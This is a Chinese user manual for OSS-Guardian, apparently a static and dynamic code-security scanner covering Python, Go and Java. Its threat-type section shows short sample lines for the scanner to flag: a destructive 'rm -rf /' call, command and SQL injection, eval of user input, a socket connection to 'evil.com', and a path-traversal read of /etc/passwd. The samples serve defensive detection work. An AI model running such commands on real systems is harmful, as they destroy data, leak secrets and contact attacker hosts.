# OSS-Guardian 详细使用说明

本文档提供 OSS-Guardian 系统的详细使用指南，包括安装、配置、命令行使用、Web 界面使用等各个方面。

## 目录

1. [安装与配置](#安装与配置)
2. [命令行使用](#命令行使用)
3. [Web 界面使用](#web-界面使用)
4. [分析引擎详解](#分析引擎详解)
5. [威胁类型说明](#威胁类型说明)
6. [报告解读](#报告解读)
7. [常见问题](#常见问题)

## 安装与配置

### 详细安装步骤

#### 1. 环境准备

确保系统满足以下要求：

- **操作系统**：Windows 10 或 Windows 11
- **Python 版本**：Python 3.7 或更高版本
- **内存**：至少 2GB 可用内存
- **磁盘空间**：至少 100MB 可用空间

检查 Python 版本：

```bash
python --version
```

#### 2. 安装依赖

进入项目目录：

```bash
cd OSS-Guardain
```

安装依赖包：

```bash
pip install -r requirements.txt
```

依赖包包括：
- `streamlit>=1.28.0` - Web UI 框架
- `pyyaml>=6.0` - YAML 配置文件解析

#### 3. 验证安装

运行测试命令验证安装是否成功：

```bash
python main_controller.py tests/malware_demo.py
```

如果看到分析结果输出，说明安装成功。

### 配置文件说明

#### settings.yaml

系统主配置文件，位于 `config/settings.yaml`：

```yaml
# 动态分析超时时间（秒）
timeout: 30

# 日志文件存储路径
log_path: data/logs/

# 报告输出路径
report_path: data/reports/

# 中间结果存储路径
intermediate_path: data/intermediate/

# 上传目录
upload_path: data/uploads/

# 最大文件大小（字节，10MB）
max_file_size: 10485760

# 启用/禁用动态分析
enable_dynamic_analysis: true

# 启用/禁用静态分析
enable_static_analysis: true

# 日志级别
log_level: INFO
```

**配置项说明**：

- `timeout`：动态分析超时时间，建议设置为 30-60 秒
- `log_path`：日志文件存储目录，确保目录存在
- `report_path`：报告输出目录，系统会自动创建
- `enable_dynamic_analysis`：是否启用动态分析（需要 Hook 支持）
- `enable_static_analysis`：是否启用静态分析

#### rules.yaml

安全检测规则库，位于 `config/rules.yaml`。包含 30+ 条安全检测规则，支持 Python、Go、Java 三种语言。

每条规则包含：

- `id`：规则唯一标识符
- `name`：规则名称
- `pattern`：正则表达式模式
- `severity`：严重程度（critical/high/medium/low）
- `description`：规则描述
- `language`：可选，指定规则适用的语言（python/go/java），不指定则适用于所有语言

**规则类型**：

- **Python 规则**：
  - WebShell 检测规则（5 条）
  - SQL 注入检测规则（3 条）
  - RCE 检测规则（4 条）
  - 文件操作风险规则（3 条）
  - 网络连接风险规则（3 条）
  - 后门检测规则（4 条）
  - 信息泄露规则（2 条）

- **Go 语言规则**（5 条）：
  - `go_rce_exec_command`：exec.Command() 调用
  - `go_os_exec`：os/exec 包使用
  - `go_network_dial`：网络连接
  - `go_sql_injection`：SQL 注入
  - `go_file_write`：文件写入操作

- **Java 语言规则**（6 条）：
  - `java_rce_runtime_exec`：Runtime.exec() 调用
  - `java_rce_processbuilder`：ProcessBuilder 使用
  - `java_sql_injection`：SQL 注入
  - `java_file_operation`：文件操作
  - `java_network_connection`：网络连接
  - `java_deserialization`：反序列化风险

**自定义规则**：

可以添加自定义规则到 `rules.yaml`：

```yaml
rules:
  - id: custom_rule_1
    name: "Custom Rule Name"
    pattern: "your_regex_pattern"
    severity: "high"
    description: "Rule description"
    language: "python"  # 可选：python, go, java，不指定则适用于所有语言
```

## 命令行使用

### main_controller.py 使用方法

#### 基本语法

```bash
python main_controller.py <文件路径>
```

#### 参数说明

- `<文件路径>`：要分析的源代码文件路径（必需）
  - 支持 Python 文件（`.py`）
  - 支持 Go 文件（`.go`）
  - 支持 Java 文件（`.java`）
  - 系统会自动检测文件语言类型

#### 示例命令

分析测试文件：

```bash
python main_controller.py tests/malware_demo.py
```

分析当前目录下的文件：

```bash
python main_controller.py ./my_script.py
```

分析绝对路径文件：

```bash
python main_controller.py D:\Projects\test.py
```

#### 输出结果解读

命令行输出包含以下信息：

1. **预处理阶段**
   ```
   [INFO] Reading file: <文件路径>
   [INFO] Building AST...
   [INFO] Extracting symbols...
   [INFO] Generating IR...
   ```

2. **静态分析阶段**
   ```
   [INFO] Performing static analysis...
   ```

3. **动态分析阶段**（如果启用）
   ```
   [INFO] Performing dynamic analysis...
   ```

4. **结果分析阶段**
   ```
   [INFO] Aggregating results...
   [INFO] Identifying threats...
   [INFO] Assessing risk...
   [INFO] Generating reports...
   ```

5. **完成信息**
   ```
   [SUCCESS] Analysis complete. Risk score: <分数>/100
   ```

#### 输出文件

分析完成后，会在 `data/reports/` 目录下生成：

- `<文件名>_<时间戳>.json` - JSON 格式报告（机器可读）
- `<文件名>_<时间戳>.html` - HTML 格式报告（可视化，中文界面）
- `<文件名>_<时间戳>.md` - Markdown 格式报告（便于文档化）

**报告内容包含**：
- 文件信息和检测到的语言
- 风险评分和等级
- 威胁列表和详细信息
- 静态分析结果（模式匹配、污点流、CFG 结构）
- 动态分析结果（系统调用、网络活动，仅 Python）
- **依赖信息**：提取的项目依赖列表
- **CVE 匹配结果**：已知漏洞信息（中文界面）
- `<文件名>_<时间戳>.md` - Markdown 格式报告

## Web 界面使用

### 启动 Streamlit 应用

在项目根目录执行：

```bash
streamlit run app.py
```

系统会自动打开浏览器，显示 Web 界面。如果没有自动打开，请访问显示的 URL（通常是 `http://localhost:8501`）。

### 界面功能说明

#### 1. 文件上传

系统支持两种上传模式：

**单个文件上传**：
- 选择"单个文件"模式
- 点击侧边栏的文件上传器
- 选择要分析的源代码文件（支持拖拽）
- 支持的文件类型：
  - Python 文件（`.py`）
  - Go 文件（`.go`）
  - Java 文件（`.java`）
- 文件大小限制：10MB（可在 settings.yaml 中配置）

**ZIP 压缩包上传**：
- 选择"ZIP 压缩包"模式
- 上传包含多个文件的 ZIP 压缩包（支持拖拽）
- 系统会自动解压并识别所有支持的语言文件
- 显示文件列表，支持：
  - 全选/取消全选
  - 单独选择要分析的文件
  - 显示文件语言类型和图标
- 支持批量分析多个文件

#### 2. 分析选项

在侧边栏可以配置：

- **Static Analysis**：启用/禁用静态分析
- **Dynamic Analysis**：启用/禁用动态分析

#### 3. 执行分析

点击 "🔍 Analyze" 按钮开始分析。

分析过程中会显示：
- 进度条
- 状态信息

#### 4. 结果查看

分析完成后，主界面会显示：

**风险概览**：
- Risk Score：风险分数（0-100）
- Risk Level：风险等级（LOW/MEDIUM/HIGH/CRITICAL）
- Threats Found：发现的威胁数量

**威胁分类统计**：
- Critical：严重威胁数量
- High：高危威胁数量
- Medium：中等威胁数量
- Low：低危威胁数量

**威胁列表表格**：
- Type：威胁类型
- Severity：严重程度
- Description：威胁描述
- Lines：相关行号

**详细结果**：
- 静态分析结果（可展开）
- 动态分析结果（可展开）
- 威胁详细信息（可展开）

#### 5. 代码阅读器

分析完成后，可以查看源代码并高亮威胁位置：

- 点击"📖 查看源代码（威胁位置高亮）"按钮
- 右侧面板会显示代码阅读器
- **威胁高亮**：
  - 🔴 严重威胁：红色背景
  - 🟠 高危威胁：橙色背景
  - 🟡 中危威胁：黄色背景
  - 🟢 低危威胁：绿色背景
- **威胁索引**：显示所有威胁位置，点击可跳转到对应行
- **隐藏/显示**：点击右上角按钮或页面右侧的切换按钮
- **只读模式**：代码阅读器为只读，不允许编辑

#### 6. 报告下载

**单个文件分析**：
在页面底部可以下载：

- **JSON 报告**：机器可读的完整数据
- **HTML 报告**：可视化报告（中文界面）
- **Markdown 报告**：便于文档化和版本控制

**批量分析（ZIP 上传）**：
在批量分析结果页面底部可以下载：

- **JSON 汇总报告**：包含所有文件的分析结果汇总
- **HTML 汇总报告**：可视化汇总报告
- **Markdown 汇总报告**：文档化汇总报告

### 使用流程示例

#### 单个文件分析

1. 启动应用：`streamlit run app.py`
2. 选择上传模式：选择"单个文件"
3. 上传文件：选择 `tests/malware_demo.py`（或 Go/Java 文件）
4. 配置选项：保持默认（静态+动态分析，Go/Java 仅静态分析）
5. 点击"开始分析"：等待分析完成
6. 查看结果：浏览威胁列表、CVE 信息、依赖信息
7. 查看代码：点击"查看源代码"按钮，在右侧面板查看威胁位置
8. 下载报告：保存 JSON、HTML 或 Markdown 报告

#### 批量分析（ZIP 上传）

1. 启动应用：`streamlit run app.py`
2. 选择上传模式：选择"ZIP 压缩包"
3. 上传 ZIP 文件：选择包含多个源代码文件的 ZIP 压缩包
4. 选择文件：使用全选/取消全选或单独选择要分析的文件
5. 点击"开始分析"：等待批量分析完成
6. 查看汇总结果：查看整体风险评估、所有威胁汇总
7. 查看各文件详情：展开各文件的分析结果
8. 下载汇总报告：保存批量分析的汇总报告

## 分析引擎详解

### 预处理引擎

预处理引擎负责将源代码转换为可分析的形式。

#### language_detector.py - 语言检测器

- 功能：自动检测源代码文件的编程语言
- 检测方式：文件扩展名（`.py`, `.go`, `.java`）
- 备用检测：文件内容分析（检查语言特定关键字）
- 支持语言：Python、Go、Java 等
- 输出：语言标识符（'python', 'go', 'java'）

#### parser.py - 文件读取器

- 功能：读取源代码文件（支持多语言）
- 支持编码：UTF-8（优先）、Latin-1（备用）
- 错误处理：文件不存在、权限错误、编码错误

#### ast_builder.py - Python AST 构建器

- 功能：将 Python 源码解析为 AST 树
- 使用：`ast.parse()` 函数
- 输出：完整的 AST 树对象

#### go_parser.py / go_ast_builder.py - Go 语言解析器

- 功能：解析 Go 源代码文件
- 提取内容：
  - Package 名称
  - Import 语句
  - 函数定义
  - 变量声明
- 方法：正则表达式和基础解析
- 输出：简化的 AST 结构

#### java_parser.py / java_ast_builder.py - Java 语言解析器

- 功能：解析 Java 源代码文件
- 提取内容：
  - Package 名称
  - Import 语句
  - 类定义
  - 方法定义
  - 变量声明
- 方法：正则表达式和基础解析
- 输出：简化的 AST 结构

#### symbol_table.py - 符号表提取器

- 功能：提取代码中的符号信息
- 提取内容：
  - 函数定义（包括方法）
  - 变量定义
  - 导入语句
  - 类定义
- 方法：使用 `ast.NodeVisitor` 遍历 AST

#### ir_generator.py - 中间表示生成器

- 功能：将 AST 转换为线性中间表示
- 输出格式：字典列表，每个字典表示一个操作
- 操作类型：CALL, ASSIGN, IMPORT, IF, FOR, WHILE, TRY 等

### 静态分析引擎

静态分析引擎在不执行代码的情况下分析代码。

#### syntax_checker.py - Python 语法检查器

- 功能：检查 Python 语法错误
- 方法：使用 `compile()` 函数
- 输出：语法有效性、错误信息、行号

#### go_syntax_checker.py - Go 语法检查器

- 功能：检查 Go 语法错误
- 方法：使用 `go build` 命令（如果 Go 编译器可用）
- 备用：如果 Go 编译器不可用，跳过语法检查
- 输出：语法有效性、错误信息

#### java_syntax_checker.py - Java 语法检查器

- 功能：检查 Java 语法错误
- 方法：使用 `javac` 命令（如果 Java 编译器可用）
- 备用：如果 Java 编译器不可用，跳过语法检查
- 输出：语法有效性、错误信息

#### pattern_matcher.py - 模式匹配器

- 功能：使用正则表达式匹配安全规则
- 输入：源码字符串 + 规则列表
- 输出：匹配结果列表（包含行号、匹配文本、规则信息）

#### taint_analysis.py - Python 污点分析器

- 功能：追踪污点数据流
- 污点源：`sys.argv`, `input()`, `raw_input()`
- 污点汇聚点：`os.system()`, `subprocess.*()`, `eval()`, `exec()`
- 方法：AST 数据流分析
- 输出：污点传播链列表

#### go_taint_analysis.py - Go 污点分析器

- 功能：追踪 Go 代码中的污点数据流
- 污点源：`os.Args`, `flag.String()`, `flag.Int()`, `http.Request.FormValue()` 等
- 污点汇聚点：`exec.Command()`, `os.OpenFile()`, `sql.DB.Query()` 等
- 方法：正则表达式匹配和简化分析
- 输出：污点传播链列表

#### java_taint_analysis.py - Java 污点分析器

- 功能：追踪 Java 代码中的污点数据流
- 污点源：`System.in`, `args[]`, `request.getParameter()`, `request.getHeader()` 等
- 污点汇聚点：`Runtime.exec()`, `ProcessBuilder()`, `FileWriter()`, `Statement.executeQuery()` 等
- 方法：正则表达式匹配和简化分析
- 输出：污点传播链列表

#### dependency_checker.py - 依赖检查器

- 功能：自动提取项目依赖并检查已知漏洞
- **Python**：解析 `requirements.txt`, `setup.py`, `pyproject.toml`
- **Go**：解析 `go.mod`, `go.sum`
- **Java**：解析 `pom.xml`, `build.gradle`, `build.gradle.kts`
- 输出：依赖列表（包名、版本、来源文件）

#### cve_matcher.py - CVE 匹配器

- 功能：将项目依赖与 CVE 数据库比对
- 数据源：本地 CVE 数据库（`data/cve_database.json`）
- 匹配方式：包名匹配和版本范围检查
- 输出：匹配的 CVE 漏洞列表（CVE ID、描述、严重程度、修复版本）

#### dataflow_analysis.py - 数据流分析器

- 功能：完整的数据流路径分析
- 方法：基于污点分析，追踪数据从输入点到敏感操作的完整路径
- 输出：数据流路径列表（包含中间节点）
- 未来扩展：检测数据过滤和转换点

#### cfg_analysis.py - 控制流分析器

- 功能：识别控制流结构
- 识别类型：if, for, while, try
- 输出：控制流结构列表（包含行号、条件、主体行号）

### 动态分析引擎

动态分析引擎通过执行代码来检测运行时行为。

#### syscall_monitor.py - 系统调用监控器

- 功能：Hook 危险函数调用和文件操作
- Hook 方法：Monkey Patch（函数替换）
- Hook 的函数：
  - `os.system()`
  - `os.popen()`
  - `socket.socket.connect()`
  - `subprocess.call()`
  - `subprocess.run()`
  - `subprocess.Popen()`
  - `open()`（内置函数）
  - `os.open()`
- 日志格式：`[TIMESTAMP] [ALERT] SYSCALL: <函数名> called with <参数>`
- 文件操作日志：`[TIMESTAMP] [ALERT] FILE OPEN: open() called with file='<路径>', mode='<模式>'`

#### sandbox.py - 沙箱执行器

- 功能：在受控环境中运行目标代码
- 方法：创建包装脚本，在子进程中安装 Hook 后执行
- 特性：
  - 超时控制
  - 输出捕获（stdout/stderr）
  - 日志记录

#### network_monitor.py - 网络监控器

- 功能：分析日志中的网络活动
- 检测内容：socket.connect, socket.bind 调用
- 输出：网络活动列表（包含目标地址、时间戳）

#### fuzzer.py - 模糊测试器

- 功能：生成随机参数测试代码
- 测试用例：随机字符串、注入模式
- 检测：崩溃、异常、超时
- 输出：测试结果列表

### 结果分析引擎

结果分析引擎整合分析结果并生成报告。

#### aggregator.py - 结果聚合器

- 功能：合并静态和动态分析结果
- 输出：统一的结果字典，包含统计信息

#### threat_identifier.py - 威胁识别器

- 功能：将检测结果映射为威胁类型
- 威胁类型：RCE, Command Injection, WebShell, SQL Injection, Backdoor, Network Exfiltration, File Operation Risk, Runtime Vulnerability
- 输出：威胁列表（包含证据、行号）

#### risk_assessor.py - 风险评估器

- 功能：计算风险分数
- 评分规则：
  - Critical：+30 分
  - High：+15 分
  - Medium：+5 分
  - Low：+1 分
- 分数上限：100 分
- 风险等级：
  - 0-19：LOW
  - 20-49：MEDIUM
  - 50-79：HIGH
  - 80-100：CRITICAL

#### report_generator.py - 报告生成器

- 功能：生成 JSON、HTML 和 Markdown 报告
- JSON 报告：完整的机器可读数据
- HTML 报告：可视化报告（中文界面），包含表格、样式、威胁详情、CVE 信息
- Markdown 报告：便于文档化和版本控制的报告格式

#### file_monitor.py - 文件活动监控器

- 功能：监控文件读写操作
- 监控内容：
  - 文件打开操作（`open()`, `os.open()`）
  - 文件路径
  - 操作模式（读/写）
  - 敏感文件检测（如 `/etc/passwd`, `.env`, `.git/config` 等）
- 方法：通过 syscall_monitor 的 Hook 实现
- 输出：文件操作日志列表

#### memory_analyzer.py - 内存分析器

- 功能：分析内存中的恶意代码注入（占位实现）
- 状态：基础框架，标记为未来功能
- 未来扩展：需要进程内存转储、Shellcode 模式匹配等高级技术

## 多语言支持说明

### 支持的语言

OSS-Guardian 目前支持三种编程语言的安全分析：

#### Python（完整支持）

- ✅ 完整的 AST 分析
- ✅ 污点追踪
- ✅ CFG 分析
- ✅ 静态分析
- ✅ 动态分析（系统调用监控、网络监控、文件监控）

#### Go（静态分析支持）

- ✅ 语法检查（需要 Go 编译器）
- ✅ 模式匹配（Go 特定规则）
- ✅ 污点分析（简化实现）
- ✅ 依赖检查（`go.mod`）
- ✅ CVE 匹配
- ❌ 动态分析（未来版本支持）

#### Java（静态分析支持）

- ✅ 语法检查（需要 Java 编译器）
- ✅ 模式匹配（Java 特定规则）
- ✅ 污点分析（简化实现）
- ✅ 依赖检查（`pom.xml`, `build.gradle`）
- ✅ CVE 匹配
- ❌ 动态分析（未来版本支持）

### 语言检测

系统会自动检测文件语言：

1. **文件扩展名检测**：`.py` → Python, `.go` → Go, `.java` → Java
2. **内容检测**（备用）：分析文件内容中的语言特定关键字

### 依赖检查

系统会自动检测并分析项目依赖：

- **Python**：从 `requirements.txt`, `setup.py`, `pyproject.toml` 提取
- **Go**：从 `go.mod` 提取
- **Java**：从 `pom.xml` 或 `build.gradle` 提取

提取的依赖会与 CVE 数据库比对，识别已知漏洞。

## 威胁类型说明

### RCE (Remote Code Execution)

**检测原理**：检测 `os.system()`, `subprocess.*()` 等命令执行函数调用

**严重程度**：Critical

**示例代码**：
```python
os.system("rm -rf /")  # 危险！
```

### Command Injection

**检测原理**：污点分析检测 `sys.argv` 或 `input()` 直接流向 `os.system()`

**严重程度**：Critical

**示例代码**：
```python
user_input = sys.argv[1]
os.system("echo " + user_input)  # 命令注入漏洞
```

### WebShell

**检测原理**：检测 `eval()`, `exec()`, `__import__()`, `compile()` 等动态代码执行函数

**严重程度**：Critical

**示例代码**：
```python
eval(user_input)  # WebShell 特征
```

### SQL Injection

**检测原理**：检测 SQL 查询中的字符串拼接或格式化

**严重程度**：High

**示例代码**：
```python
query = "SELECT * FROM users WHERE id = " + user_id  # SQL 注入风险
```

### Backdoor

**检测原理**：检测硬编码密码、密钥、Base64 混淆代码

**严重程度**：High

**示例代码**：
```python
PASSWORD = "admin123"  # 硬编码密码
```

### Network Exfiltration

**检测原理**：动态监控检测网络连接活动

**严重程度**：Medium

**示例代码**：
```python
sock.connect(("evil.com", 1234))  # 可疑网络连接
```

### File Operation Risk

**检测原理**：检测路径遍历、敏感文件访问

**严重程度**：Medium

**示例代码**：
```python
open("../../../etc/passwd")  # 路径遍历
```

### Runtime Vulnerability

**检测原理**：模糊测试检测运行时崩溃

**严重程度**：High

### CVE 漏洞

**检测原理**：通过依赖检查，比对项目依赖与 CVE 数据库

**严重程度**：根据 CVE 严重程度（Critical/High/Medium/Low）

**检测范围**：
- Python：从 `requirements.txt`, `setup.py`, `pyproject.toml` 提取依赖
- Go：从 `go.mod` 提取依赖
- Java：从 `pom.xml`, `build.gradle` 提取依赖

**示例**：
```json
{
  "dependency": {"name": "requests", "version": "2.28.0"},
  "cve_id": "CVE-2023-32681",
  "description": "Requests library vulnerable to SSRF",
  "severity": "high",
  "vulnerable_versions": "<2.31.0",
  "fixed_version": "2.31.0"
}
```

## 批量分析功能

### ZIP 文件上传

系统支持上传 ZIP 压缩包进行批量分析：

1. **上传 ZIP 文件**：
   - 选择"ZIP 压缩包"上传模式
   - 上传包含源代码文件的 ZIP 压缩包
   - 系统自动解压并扫描支持的文件

2. **文件选择**：
   - 系统显示所有检测到的文件（Python、Go、Java）
   - 使用"全选"按钮选择所有文件
   - 使用"取消全选"按钮取消选择
   - 或单独勾选要分析的文件

3. **批量分析**：
   - 点击"开始分析"按钮
   - 系统依次分析选中的文件
   - 显示分析进度

4. **结果查看**：
   - **汇总统计**：总文件数、成功/失败数量、威胁总数
   - **整体风险评估**：平均风险分数、整体风险等级
   - **所有威胁汇总**：所有文件的威胁列表
   - **各文件详细结果**：可展开查看每个文件的分析结果

5. **报告下载**：
   - 下载批量分析的汇总报告
   - 支持 JSON、HTML、Markdown 格式

### 批量分析注意事项

- 分析时间与文件数量成正比
- 大项目可能需要较长时间
- 建议先选择少量文件测试
- 动态分析仅对 Python 文件有效

## 代码阅读器使用

### 功能说明

代码阅读器是右侧面板工具，用于查看源代码并高亮威胁位置。

### 使用方法

1. **打开阅读器**：
   - 完成单个文件分析后
   - 点击"📖 查看源代码（威胁位置高亮）"按钮
   - 右侧面板自动显示

2. **威胁高亮**：
   - 威胁行使用不同颜色背景高亮
   - 严重程度对应颜色：
     - 🔴 严重（Critical）：红色背景
     - 🟠 高危（High）：橙色背景
     - 🟡 中危（Medium）：黄色背景
     - 🟢 低危（Low）：绿色背景

3. **威胁索引**：
   - 显示所有威胁位置列表
   - 点击威胁项可自动跳转到对应代码行
   - 显示威胁类型和严重程度

4. **隐藏/显示**：
   - 点击右上角"关闭"按钮
   - 或点击页面右侧的切换按钮
   - 面板会平滑收起/展开

5. **代码浏览**：
   - 显示完整源代码
   - 显示行号
   - 只读模式，不允许编辑
   - 深色主题，便于阅读

## 报告解读

### JSON 报告结构

JSON 报告包含以下主要部分：

```json
{
  "report_metadata": {
    "generated_at": "2024-01-01T12:00:00",
    "tool": "OSS-Guardian",
    "version": "1.0",
    "language": "python"  // 检测到的语言
  },
  "analysis_results": {
    "file_path": "...",
    "aggregated_results": {
      "static": {...},
      "dynamic": {...},
      "summary": {...}
    },
    "threats": [...],
    "risk_assessment": {
      "risk_score": 85,
      "risk_level": "high",
      "threat_count": 5,
      "breakdown": {...}
    }
  }
}
```

### HTML 报告说明

HTML 报告包含：

1. **风险评分卡片**：大号显示风险分数和等级
2. **威胁统计**：按严重程度分类的威胁数量
3. **威胁列表表格**：所有威胁的详细信息
4. **详细证据**：每个威胁的支持证据

### 如何理解风险分数

- **0-19 分（LOW）**：代码相对安全，只有少量低危问题
- **20-49 分（MEDIUM）**：存在中等风险，建议审查
- **50-79 分（HIGH）**：存在高风险，需要立即处理
- **80-100 分（CRITICAL）**：存在严重安全威胁，必须修复

### 静态分析结果解读

报告中的 `static_results` 部分包含：

- **pattern_matches**：模式匹配结果（匹配的安全规则）
- **taint_flows**：污点流分析结果（数据流追踪）
- **cfg_structures**：控制流结构（if/for/while/try）
- **syntax_valid**：语法检查结果
- **symbols**：符号表（函数、变量、类等）
- **dependencies**：**项目依赖列表**（新增）
  - 包名、版本、来源文件
- **cve_matches**：**CVE 匹配结果**（新增）
  - CVE ID、描述、严重程度、修复版本

### CVE 漏洞报告

如果检测到依赖中存在已知 CVE 漏洞，报告会包含：

- **CVE ID**：漏洞标识符（如 CVE-2023-32681）
- **描述**：漏洞详细描述
- **严重程度**：critical/high/medium/low
- **受影响版本**：存在漏洞的版本范围
- **修复版本**：建议升级到的安全版本
- **依赖信息**：受影响的依赖包名和当前版本

### 依赖信息报告

报告会列出项目使用的所有依赖：

- **包名**：依赖包名称
- **版本**：当前使用的版本
- **来源**：依赖文件（requirements.txt, go.mod, pom.xml 等）
- **约束**：版本约束（==, >=, <= 等）

**示例**：
```json
{
  "dependencies": [
    {
      "name": "requests",
      "version": "2.28.0",
      "constraint": "==",
      "source": "requirements.txt"
    }
  ],
  "cve_matches": [
    {
      "dependency": {"name": "requests", "version": "2.28.0"},
      "cve_id": "CVE-2023-32681",
      "description": "Requests library vulnerable to SSRF",
      "severity": "high",
      "vulnerable_versions": "<2.31.0",
      "fixed_version": "2.31.0"
    }
  ]
}
```

## 常见问题

### 多语言支持相关

**Q: Go/Java 文件分析时提示"Go/Java compiler not available"？**

A: 这是正常的。如果系统没有安装 Go 或 Java 编译器，语法检查会跳过，但其他分析（模式匹配、污点分析、依赖检查）仍会正常进行。

**Q: Go/Java 文件为什么没有动态分析结果？**

A: 动态分析目前仅支持 Python。Go 和 Java 的动态分析需要不同的运行时监控技术，未来版本可能会支持。

**Q: 如何添加新的语言支持？**

A: 需要实现以下模块：
1. 语言检测器识别新语言
2. 解析器提取代码结构
3. 语法检查器（可选）
4. 污点分析器
5. 在 `main_controller.py` 中添加路由逻辑

### 依赖检查相关

**Q: 为什么没有检测到依赖？**

A: 可能的原因：
- 项目中没有依赖文件（requirements.txt, go.mod, pom.xml 等）
- 依赖文件不在项目根目录
- 依赖文件格式不正确

**Q: CVE 数据库如何更新？**

A: 编辑 `data/cve_database.json` 文件，添加新的 CVE 条目。未来版本可能会支持自动更新或 API 集成。

### ZIP 上传相关

**Q: ZIP 文件上传后全选/取消全选按钮无效？**

A: 已修复。现在使用 `st.rerun()` 确保状态正确更新。如果仍有问题，请刷新页面。

**Q: ZIP 文件中哪些文件会被分析？**

A: 系统会自动识别并提取以下文件：
- Python 文件（`.py`）
- Go 文件（`.go`）
- Java 文件（`.java`）

其他文件会被忽略。

### 代码阅读器相关

**Q: 代码阅读器无法显示？**

A: 检查：
1. 是否完成了文件分析
2. 浏览器是否支持 JavaScript
3. 尝试刷新页面

**Q: 威胁位置高亮不准确？**

A: 威胁位置基于行号匹配。如果代码在分析后被修改，行号可能不匹配。重新分析文件即可。

### 报告相关

**Q: Markdown 报告如何使用？**

A: Markdown 报告可以：
- 直接在支持 Markdown 的编辑器中查看
- 提交到代码仓库作为文档
- 转换为其他格式（PDF、HTML 等）

**Q: 批量分析报告包含哪些内容？**

A: 批量分析汇总报告包含：
- 分析的文件总数和成功/失败统计
- 整体风险评估
- 所有威胁的汇总列表
- 各文件的简要结果

## 故障排除

### 分析失败

**问题**：分析过程中出现错误

**解决方案**：
1. 检查文件路径是否正确
2. 检查文件编码（支持 UTF-8 和 Latin-1）
3. 查看错误详情（Web 界面会显示错误信息）
4. 检查日志文件（`data/logs/`）

### 动态分析无结果

**问题**：Python 文件动态分析没有结果

**解决方案**：
1. 确保启用了动态分析选项
2. 检查代码是否实际执行了被监控的函数
3. 某些代码可能因为条件判断而未执行
4. 查看沙箱执行日志（`data/logs/`）

### 依赖检查无结果

**问题**：没有检测到项目依赖

**解决方案**：
1. 确保依赖文件在项目根目录
2. Python：检查 `requirements.txt`, `setup.py`, `pyproject.toml`
3. Go：检查 `go.mod` 文件
4. Java：检查 `pom.xml` 或 `build.gradle`
5. 确保依赖文件格式正确

### 代码阅读器不显示

**问题**：点击按钮后代码阅读器不出现

**解决方案**：
1. 确保已完成文件分析
2. 检查浏览器控制台是否有 JavaScript 错误
3. 尝试刷新页面
4. 检查浏览器是否支持现代 JavaScript 特性

---

## 常见问题（原有）

### FAQ

**Q: 为什么动态分析没有检测到网络连接？**

A: 确保目标代码实际执行了网络连接代码。某些代码可能因为条件判断而未执行。

**Q: 污点分析为什么没有检测到某些注入漏洞？**

A: 污点分析是简化版本，只能追踪直接的变量赋值。复杂的控制流可能无法完全追踪。

**Q: 如何添加自定义检测规则？**

A: 编辑 `config/rules.yaml`，添加新的规则条目。参考现有规则的格式。

**Q: 报告文件保存在哪里？**

A: 默认保存在 `data/reports/` 目录。可以在 `config/settings.yaml` 中修改 `report_path`。

**Q: 可以分析多个文件吗？**

A: 是的！现在支持两种方式：
1. **ZIP 上传**：上传包含多个文件的 ZIP 压缩包，系统会自动识别并支持批量分析
2. **命令行批量**：可以编写脚本循环调用 `main_controller.py` 分析多个文件

**Q: 如何更新 CVE 数据库？**

A: 编辑 `data/cve_database.json` 文件，添加新的 CVE 条目。格式参考现有条目。未来版本可能会支持自动更新或 API 集成。

**Q: 代码阅读器在哪里？**

A: 完成单个文件分析后，点击"📖 查看源代码（威胁位置高亮）"按钮，右侧会显示代码阅读器面板。可以点击右上角按钮或页面右侧的切换按钮来隐藏/显示。

**Q: 为什么 Go/Java 文件没有动态分析结果？**

A: 动态分析目前仅支持 Python。Go 和 Java 的动态分析需要不同的运行时监控技术（如 ptrace、JVM 工具等），未来版本可能会支持。

### 故障排除

**问题：导入错误 `ModuleNotFoundError`**

解决：
```bash
pip install -r requirements.txt
```

**问题：动态分析超时**

解决：增加 `config/settings.yaml` 中的 `timeout` 值

**问题：日志文件无法写入**

解决：确保 `data/logs/` 目录存在且有写权限

**问题：Streamlit 无法启动**

解决：
```bash
pip install --upgrade streamlit
streamlit run app.py
```

### 性能优化建议

1. **大文件分析**：对于大文件（>1000 行），建议只启用静态分析
2. **批量分析**：使用命令行模式进行批量分析，避免 Web 界面开销
3. **规则优化**：如果只关注特定威胁，可以注释掉不需要的规则
4. **超时设置**：根据代码复杂度调整超时时间

---

**提示**：更多问题请查看项目 Issue 或提交新 Issue。
